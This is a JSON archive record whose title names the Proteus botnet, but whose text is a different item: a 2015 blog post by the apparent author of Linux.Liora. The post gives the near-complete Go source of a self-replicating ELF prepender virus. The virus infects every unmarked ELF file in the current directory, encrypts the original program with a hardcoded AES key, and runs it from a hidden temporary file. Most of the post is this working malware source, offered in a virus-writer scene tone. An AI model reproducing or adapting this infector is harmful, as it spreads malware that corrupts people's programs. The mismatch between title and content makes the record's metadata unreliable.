{
    "id": "0e522ddf-1a20-42f2-99b2-9a16c5d173c4",
    "created_at": "2023-01-12T15:07:20.709351Z",
    "updated_at": "2025-03-27T02:05:38.301201Z",
    "deleted_at": null,
    "sha1_hash": "eff15b7b53301c1de1be18e2e0ea5521e251b64f",
    "title": "2016-11-28 - A New All-in-One Botnet- Proteus",
    "authors": "",
    "file_creation_date": "2022-05-01T14:12:18Z",
    "file_modification_date": "2022-05-01T14:12:18Z",
    "file_size": 116102,
    "plain_text": "# Linux.Liora: a Go virus\n\n**guitmz.com/linux-liora**\n\nGuilherme Thomazi May 15, 2015\n\n## 4 minute read  Published: 15 May, 2015\n\n Simple prepender virus written in GoLang\n\n So this guy asks me in a job interview last week “Have you ever developed in Go?” and well what’s best to learn a language than writting a prepender (probably a lot of things but don’t kill my thrill)?\n\n There you have it, the probably first ever binary infector written in GoLang (SPTH LIP hxxp://spth.virii.lu/LIP.html “outdately” confirms that - replace hxxp with http, this website is wrongly classified as malicious for some security tools).\n\n Basically a port from my Linux.Zariche ‘cause my life is in a hurry. I need some time in now to improve those beauties.\n\n Here’s the virus source code (https://github.com/guitmz/go-liora):\n\n\n-----\n\n```\n/\n* Linux.Liora - This is a POC ELF prepender written in Go by TMZ (2015).\n* It is probably the first binary infector ever written in this language, that's\ncool.\n* The above affirmation is based on SPTH LIP page: http://spth.virii.lu/LIP.html\n*\n* Linux.Liora (May 2015) - Simple binary infector in GoLang (prepender).\n* This version encrypts the host code with AES and decrypts it at runtime.\n* It's almost a direct port from my Vala infector Linux.Zariche.B.\n*\n* Compile with: go build -i liora.go (where go >= 1.4.2)\n* It has no external dependencies so it should compile under most systems (x86 and\nx86_64).\n* It's also possible to easly adapt it to be a PE infector and compile under Windows.\n*\n* Use at your own risk, I'm not responsible for any damages that this may cause.\n*\n* A shout for those who keeps the scene alive: herm1t, alcopaul, hh86, SPTH, genetix,\nR3s1stanc3 & others\n*\n* Feel free to email me: tmz@null.net || You can also find me at http://vxheaven.org/\nand on Twitter @TMZvx\n*\n* http://vx.thomazi.me\n*/\npackage main\nimport (\n  \"bufio\"\n  \"io/ioutil\"\n  \"os\"\n  \"os/exec\"\n  \"strings\"\n  \"crypto/aes\"\n  \"crypto/cipher\"\n  \"math/rand\"\n  \"time\"  \n)\nfunc check(e error) {\n  // Reading files requires checking most calls for errors.\n  // This helper will streamline our error checks below.\n  if e != nil {\n    panic(e)\n  }\n}\nfunc CheckELF(file string) bool {\n  f, err := os.Open(file)\n  check(err)\n  bytes := make([]byte, 4) //read the magic number\n  f.Read(bytes)\n\n```\n\n-----\n\n```\n  f.Close()\n  //check if is an ELF\n  if strings.Contains(string(bytes), \"ELF\"){\n    return true \n  } else {\n    return false\n  }\n}\nfunc CheckInfected(file string) bool {\n  _mark := \"=TMZ=\" //infection mark\n     fi, err := os.Open(file)\n     check(err)\n     myStat, err := fi.Stat()\n     check(err)\n     size := myStat.Size()\n     buf := make([]byte, size)\n     fi.Read(buf)\n     fi.Close()\n     var x int64\n     for x = 1; x < size; x++ {\n    if buf[x] == _mark[0] {\n              var y int64      \n      for y = 1; y < int64(len(_mark)); y++ {\n        if (x + y) >= size {\n            break\n                        }\n          if buf[x + y] != _mark[y] {\n              break\n                        }\n        }\n        if y == int64(len(_mark)) {\n          return true; //infected!\n        }\n              }\n          }\n  return false; //not infected\n}\nfunc Infect(file string) {\n     dat, err := ioutil.ReadFile(file) //read host\n     check(err)\n     vir, err := os.Open(os.Args[0]) //read virus\n     check(err)\n     virbuf := make([]byte, 1666208)\n     vir.Read(virbuf)\n     encDat := Encrypt(dat) //encrypt host\n\n```\n\n-----\n\n```\n     f, err : os.OpenFile(file, os.O_RDWR, 0666) //open host\n     check(err)\n     w := bufio.NewWriter(f)\n     w.Write(virbuf) //write virus\n     w.Write(encDat) //write encypted host\n     w.Flush() //make sure we are all set\n     f.Close()\n     vir.Close()\n}\nfunc RunHost() {\n  hostbytes := \".\" + Rnd(8) //generate hidden random name\n  h, err := os.Create(hostbytes) //create tmp with above name\n  check(err)\n  infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself\n  check(err)\n  allSZ := len(infected_data) //get file full size\n  hostSZ := allSZ - 1666208 //calculate host size\n  f, err := os.Open(os.Args[0]) //open host\n  check(err)\n  f.Seek(1666208, os.SEEK_SET) //go to host start\n  hostBuf := make([]byte, hostSZ)\n  f.Read(hostBuf) //read it\n  plainHost := Decrypt(hostBuf) //decrypt host\n  w := bufio.NewWriter(h)\n  w.Write(plainHost) //write plain host to tmp file\n  w.Flush() //make sure we are all set\n  h.Close()\n  f.Close()\n  os.Chmod(hostbytes, 0755) //give it proper permissions\n  out, err := exec.Command(\"./\" + hostbytes).Output()\n  check(err)\n  print(string(out))\n  os.Remove(hostbytes)\n}\nfunc Encrypt(toEnc []byte) []byte {\n  key := \"SUPER_SECRET_KEY\" // 16 bytes!\n  block,err := aes.NewCipher([]byte(key))\n  check(err)\n  // 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256\n  ciphertext := []byte(\"ASUPER_SECRET_IV\") \n  iv := ciphertext[:aes.BlockSize] // const BlockSize = 16\n\n```\n\n-----\n\n```\n  encrypter := cipher.NewCFBEncrypter(block, iv)\n  encrypted := make([]byte, len(toEnc))\n  encrypter.XORKeyStream(encrypted, toEnc)\n  //fmt.Printf(\"%s encrypted to %v\\n\", toEnc, encrypted)\n  return encrypted\n}\nfunc Decrypt(toDec []byte) []byte {\n  key := \"SUPER_SECRET_KEY\" // 16 bytes\n  block,err := aes.NewCipher([]byte(key))\n  check(err)\n  // 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256\n  ciphertext := []byte(\"ASUPER_SECRET_IV\") \n  iv := ciphertext[:aes.BlockSize] // const BlockSize = 16\n  decrypter := cipher.NewCFBDecrypter(block, iv) // simple\n  decrypted := make([]byte, len(toDec))\n  decrypter.XORKeyStream(decrypted, toDec)\n  return decrypted\n}\nfunc Rnd(n int) string {\n  rand.Seed(time.Now().UTC().UnixNano())\n  var letters = []rune(\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\")\n  b := make([]rune, n)\n  for i := range b {\n    b[i] = letters[rand.Intn(len(letters))]\n  }\n  return string(b)\n}\nfunc GetSz(file string) int64 {\n  myHnd, err := os.Open(file)\n  check(err)\n  defer myHnd.Close()\n  myStat, err := myHnd.Stat()\n  check(err)\n  mySZ := myStat.Size()\n  myHnd.Close()\n  return mySZ\n}\nfunc main() {\n\n```\n\n-----\n\n```\n  virPath : os.Args[0]\n     files, _ := ioutil.ReadDir(\".\")\n     for _, f := range files {\n          if CheckELF(f.Name()) == true {\n              if CheckInfected(f.Name()) == false {\n                   if !strings.Contains(virPath, f.Name()) {\n                        Infect(f.Name())\n                   }\n              }\n          }\n     }\n  if GetSz(os.Args[0]) > 1666208 {\n    RunHost()\n  } else {\n    os.Exit(0)\n  }\n}\n\n## Simple enough! Go is a quite fun language, I’ll keep it in mind for future projects.\n\n TMZ\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Infection/ELF Infection in Go - Liora virus.pdf"
    ],
    "report_names": [
        "ELF Infection in Go - Liora virus.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536040,
    "ts_updated_at": 1743041138,
    "ts_creation_date": 1651414338,
    "ts_modification_date": 1651414338,
    "files": {
        "pdf": "https://archive.orkl.eu/eff15b7b53301c1de1be18e2e0ea5521e251b64f.pdf",
        "text": "https://archive.orkl.eu/eff15b7b53301c1de1be18e2e0ea5521e251b64f.txt",
        "img": "https://archive.orkl.eu/eff15b7b53301c1de1be18e2e0ea5521e251b64f.jpg"
    }
}